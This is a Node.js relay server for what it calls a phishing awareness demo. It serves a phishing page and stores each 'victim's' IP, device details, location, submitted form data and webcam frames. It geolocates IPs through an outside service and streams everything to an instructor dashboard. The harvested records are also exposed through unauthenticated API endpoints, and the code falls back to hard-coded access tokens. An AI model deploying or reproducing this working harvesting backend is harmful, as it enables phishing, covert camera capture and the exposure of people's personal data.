// relay.js — CSA Phishing Awareness Demo · Unified Relay Server v2.2
// ─────────────────────────────────────────────────────────────────────
// Unified server: Handles WebSockets, REST API, and Static HTML files.
// ─────────────────────────────────────────────────────────────────────

'use strict';

require('dotenv').config();

const { WebSocketServer } = require('ws');
const fs = require('fs');
const path = require('path');
const http = require('http');
const Database = require('better-sqlite3');

// ── CONFIG ────────────────────────────────────────────────────────────
const WS_PORT = process.env.WS_PORT ? parseInt(process.env.WS_PORT) : 8765;
const TRUST_PROXY = process.env.TRUST_PROXY !== 'false';
const LOG_FILE = path.join(__dirname, 'relay.log');
const DB_FILE = path.join(__dirname, 'sessions.db');

// Session label
const DEFAULT_SESSION = process.env.SESSION_ID || new Date().toISOString().slice(0, 16).replace(':', '-');

// ── TOKENS FROM .env ──────────────────────────────────────────────────
// Each INSTR_TOKEN_* env var has the format  "TOKEN:room"
// e.g.  INSTR_TOKEN_DEFAULT=CSA-DEMO-2026:default
const INSTRUCTOR_TOKENS = {};
for (const [key, val] of Object.entries(process.env)) {
  if (key.startsWith('INSTR_TOKEN_') && val.includes(':')) {
    const colonIdx = val.indexOf(':');
    const token = val.slice(0, colonIdx).trim();
    const room  = val.slice(colonIdx + 1).trim();
    if (token && room) INSTRUCTOR_TOKENS[token] = room;
  }
}
// Fallback so the server still works when .env is missing (NOT recommended for production)
if (Object.keys(INSTRUCTOR_TOKENS).length === 0) {
  log('⚠  No INSTR_TOKEN_* vars found in .env — using hard-coded fallback tokens (insecure!)');
  INSTRUCTOR_TOKENS['CSA-DEMO-2026'] = 'default';
  INSTRUCTOR_TOKENS['CSA-AM-2026']   = 'session_AM';
  INSTRUCTOR_TOKENS['CSA-PM-2026']   = 'session_PM';
}

// ── LIMITS ────────────────────────────────────────────────────────────
const MAX_MSG_BYTES  = 300 * 1024;  // 300 KB – largest valid mugshot
const FRAME_MIN_MS   = 60;          // drop frames arriving faster than ~16 fps
const AUTH_MAX_TRIES = 5;           // max wrong-token attempts per IP
const AUTH_WINDOW_MS = 60 * 1000;   // … within this rolling window (60 s)

const DEFAULT_CONFIG = {
  type: 'config_update',
  eventName: 'National Cyber Hygiene Workshop 2026',
  eventDate: '27 March 2026',
  eventTime: '09:00 – 16:00 GMT',
  eventVenue: 'NCA Tower, Airport By-Pass, Accra'
};
let currentConfig = { ...DEFAULT_CONFIG };

// ── LOGGING ───────────────────────────────────────────────────────────
function ts() { return new Date().toISOString(); }
function log(msg) {
  const line = `[${ts()}] ${msg}`;
  console.log(line);
  fs.appendFileSync(LOG_FILE, line + '\n');
}

// ── DATABASE ──────────────────────────────────────────────────────────
const db = new Database(DB_FILE);
db.pragma('journal_mode = WAL');
db.exec(`
  CREATE TABLE IF NOT EXISTS victims (
    client_id TEXT PRIMARY KEY,
    session_id TEXT,
    ip TEXT,
    connected_at TEXT,
    device_json TEXT,
    location_json TEXT,
    form_json TEXT,
    last_frame_at TEXT,
    mugshot_url TEXT
  );
`);

const stmtUpsertVictim = db.prepare(`INSERT OR IGNORE INTO victims (client_id, session_id, ip, connected_at) VALUES (?, ?, ?, ?)`);
const stmtUpdateDevice = db.prepare(`UPDATE victims SET device_json = ? WHERE client_id = ?`);
const stmtUpdateLoc    = db.prepare(`UPDATE victims SET location_json = ? WHERE client_id = ?`);
const stmtUpdateForm   = db.prepare(`UPDATE victims SET form_json = ? WHERE client_id = ?`);
const stmtUpdateFrame  = db.prepare(`UPDATE victims SET last_frame_at = ? WHERE client_id = ?`);

// ── REGISTRY & ROUTING ───────────────────────────────────────────────
const instructorRooms = new Map();
const victimSockets   = new Set();

function addInstructor(ws, room) {
  if (!instructorRooms.has(room)) instructorRooms.set(room, new Set());
  instructorRooms.get(room).add(ws);
}
function removeInstructor(ws, room) {
  if (instructorRooms.has(room)) instructorRooms.get(room).delete(ws);
}
function broadcastAll(payload) {
  const str = JSON.stringify(payload);
  for (const rooms of instructorRooms.values()) {
    for (const ins of rooms) { if (ins.readyState === 1) ins.send(str); }
  }
}
function broadcastToVictims(payload) {
  const str = JSON.stringify(payload);
  for (const v of victimSockets) { if (v.readyState === 1) v.send(str); }
}

// ── AUTH THROTTLE ─────────────────────────────────────────────────────
// Map<ip, { count: number, resetAt: number }>
const authAttempts = new Map();

function isRateLimited(ip) {
  const now = Date.now();
  const rec = authAttempts.get(ip);
  if (!rec || now > rec.resetAt) {
    // First attempt or window expired – start fresh
    authAttempts.set(ip, { count: 1, resetAt: now + AUTH_WINDOW_MS });
    return false;
  }
  rec.count++;
  if (rec.count > AUTH_MAX_TRIES) return true;
  return false;
}

function clearAuthRecord(ip) {
  authAttempts.delete(ip);
}

// ── UNIFIED HTTP SERVER ──────────────────────────────────────────────
const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = url.pathname;

  // CORS Helpers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');

  // 1. API Endpoints
  if (pathname === '/api/sessions') {
    const rows = db.prepare('SELECT DISTINCT session_id FROM victims').all();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ sessions: rows }));
  }
  if (pathname.startsWith('/api/sessions/')) {
    const sid = pathname.split('/').pop();
    const rows = db.prepare('SELECT * FROM victims WHERE session_id = ?').all(sid);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ session_id: sid, victims: rows }));
  }

  // 2. Static HTML Serving
  let filePath = '';
  if (pathname === '/' || pathname === '/phish' || pathname === '/phish.html') {
    filePath = path.join(__dirname, 'phish.html');
  } else if (pathname === '/instructor' || pathname === '/admin' || pathname === '/instructor.html') {
    filePath = path.join(__dirname, 'instructor.html');
  }

  if (filePath && fs.existsSync(filePath)) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    return fs.createReadStream(filePath).pipe(res);
  }

  res.writeHead(404);
  res.end('Not Found');
});

// ── WEBSOCKET SERVER ──────────────────────────────────────────────────
const wss = new WebSocketServer({ server });
let clientCounter = 0;

wss.on('connection', (ws, req) => {
  const ip = (TRUST_PROXY && req.headers['x-forwarded-for']) ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
  const clientId = `client_${Date.now()}_${++clientCounter}`;
  let role = 'victim';
  let room = null;
  let lastFrameAt = 0;  // timestamp of last accepted frame from this client

  victimSockets.add(ws);
  ws.send(JSON.stringify(currentConfig)); // Send current config to new victim
  stmtUpsertVictim.run(clientId, DEFAULT_SESSION, ip, ts());
  log(`[+] CONNECT     ${clientId}  IP=${ip}`);
  fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,isp,org`)
    .then(r => r.json())
    .then(geo => {
      if (geo.status === "success") {
        const geoMsg = { type: "ip_geo", clientId, city: geo.city, region: geo.regionName, country: geo.country, isp: geo.isp, org: geo.org };
        broadcastAll(geoMsg);
      }
    })
    .catch(() => {});

  ws.on('message', (raw) => {
    // ── Message size cap ──────────────────────────────────────────────
    if (raw.length > MAX_MSG_BYTES) {
      log(`[!] MSG TOO BIG  ${clientId}  ${raw.length} bytes — dropped`);
      return;
    }

    try {
      const msg = JSON.parse(raw);

      // ── Instructor Registration ──────────────────────────────────────
      if (msg.type === 'register' && msg.role === 'instructor') {
        if (isRateLimited(ip)) {
          ws.send(JSON.stringify({ type: 'auth_error', reason: 'Too many attempts — wait 60 s' }));
          log(`[!] AUTH BLOCK  ${clientId}  IP=${ip} (rate-limited)`);
          return;
        }
        if (INSTRUCTOR_TOKENS[msg.token]) {
          clearAuthRecord(ip);  // reset counter on success
          role = 'instructor';
          room = INSTRUCTOR_TOKENS[msg.token];
          victimSockets.delete(ws);
          addInstructor(ws, room);
          ws.send(JSON.stringify({ type: 'auth_ok', clientId, room, session_id: DEFAULT_SESSION }));
          log(`[!] AUTH OK     ${clientId} as Instructor (Room: ${room})`);
        } else {
          ws.send(JSON.stringify({ type: 'auth_error', reason: 'Invalid token' }));
          log(`[!] AUTH FAIL   ${clientId}  IP=${ip}`);
        }
        return;
      }

      // ── Telemetry Handling ───────────────────────────────────────────
      if (msg.type === 'device_info') {
        stmtUpdateDevice.run(JSON.stringify(msg), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'location') {
        stmtUpdateLoc.run(JSON.stringify(msg), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'form_data') {
        stmtUpdateForm.run(JSON.stringify(msg), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'frame') {
        // ── Frame-rate limiter ─────────────────────────────────────────
        const now = Date.now();
        if (now - lastFrameAt < FRAME_MIN_MS) return;  // drop frame
        lastFrameAt = now;
        stmtUpdateFrame.run(ts(), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'mugshot') {
        // Mugshots are low-frequency (once per session) — always relay
        stmtUpdateFrame.run(ts(), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'config_update' && role === 'instructor') {
        currentConfig = { ...msg };
        delete currentConfig.token;
        broadcastToVictims(currentConfig);
      }

    } catch (e) { log(`[!] MSG ERROR   ${clientId}  ${e.message}`); }
  });

  ws.on('close', () => {
    log(`[-] DISCONNECT  ${clientId}`);
    victimSockets.delete(ws);
    if (role === 'instructor' && room) removeInstructor(ws, room);
  });
});

log(`=== CSA Unified Relay v2.2 ===`);
log(`Port      : ${WS_PORT}`);
log(`Session   : ${DEFAULT_SESSION}`);
log(`Auth tokens loaded: ${Object.keys(INSTRUCTOR_TOKENS).length}`);
log(`URLs:`);
log(`  - Phish : http://localhost:${WS_PORT}/phish`);
log(`  - Admin : http://localhost:${WS_PORT}/instructor`);
log('───────────────────────────────\n');

server.listen(WS_PORT);
